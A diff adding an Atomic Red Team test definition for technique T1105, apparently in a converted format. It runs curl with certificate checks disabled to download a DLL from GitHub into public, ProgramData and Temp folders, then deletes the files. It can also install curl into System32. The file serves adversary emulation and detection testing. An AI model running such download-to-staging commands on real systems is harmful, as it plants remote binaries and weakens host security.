@@ -1,0 +1,111 @@
+{
+  "id": "2b080b99-0deb-4d51-af0f-833d37c4ca6a",
+  "name": "Curl Download File",
+  "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "46c898c3-1e7c-44ed-b0f5-eb7ff7ee1f09",
+      "type": "execute-command",
+      "data": {
+        "command": "#{curl_path} -k #{file_download} -o c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} --output c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o c:\\programdata\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o %Temp%\\allthethingsx64.dll\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f392e941-1443-42de-a1d9-e905f92b3768",
+      "type": "execute-command",
+      "data": {
+        "command": "del c:\\users\\public\\music\\allthethingsx64.dll \u003enul 2\u003e\u00261\ndel c:\\users\\public\\music\\allthethingsx64.dll \u003enul 2\u003e\u00261\ndel c:\\programdata\\allthethingsx64.dll \u003enul 2\u003e\u00261\ndel %Temp%\\allthethingsx64.dll \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "bc80cfd3-72bd-4425-8771-5b86ea2e3a9f",
+      "name": "Check dependency 1/1",
+      "description": "Curl must be installed on system.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "80ff8317-6544-46d3-b93b-4170b95a07d4",
+      "name": "Resolve dependency 1/1",
+      "description": "Curl must be installed on system.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f13226d8-92a0-4873-9ac2-985e492a1317",
+      "name": "Re-check dependency 1/1",
+      "description": "Curl must be installed on system.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "46c898c3-1e7c-44ed-b0f5-eb7ff7ee1f09",
+      "p": "on-success",
+      "o": "f392e941-1443-42de-a1d9-e905f92b3768"
+    },
+    {
+      "s": "46c898c3-1e7c-44ed-b0f5-eb7ff7ee1f09",
+      "p": "on-failure",
+      "o": "f392e941-1443-42de-a1d9-e905f92b3768"
+    },
+    {
+      "s": "bc80cfd3-72bd-4425-8771-5b86ea2e3a9f",
+      "p": "on-success",
+      "o": "46c898c3-1e7c-44ed-b0f5-eb7ff7ee1f09"
+    },
+    {
+      "s": "bc80cfd3-72bd-4425-8771-5b86ea2e3a9f",
+      "p": "on-failure",
+      "o": "80ff8317-6544-46d3-b93b-4170b95a07d4"
+    },
+    {
+      "s": "80ff8317-6544-46d3-b93b-4170b95a07d4",
+      "p": "on-success",
+      "o": "f13226d8-92a0-4873-9ac2-985e492a1317"
+    },
+    {
+      "s": "f13226d8-92a0-4873-9ac2-985e492a1317",
+      "p": "on-failure",
+      "o": "46c898c3-1e7c-44ed-b0f5-eb7ff7ee1f09"
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "file_download",
+      "type": "string",
+      "description": "File to download",
+      "value": "https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll"
+    },
+    {
+      "name": "curl_path",
+      "type": "path",
+      "description": "path to curl.exe",
+      "value": "C:\\Windows\\System32\\Curl.exe"
+    }
+  ]
+}
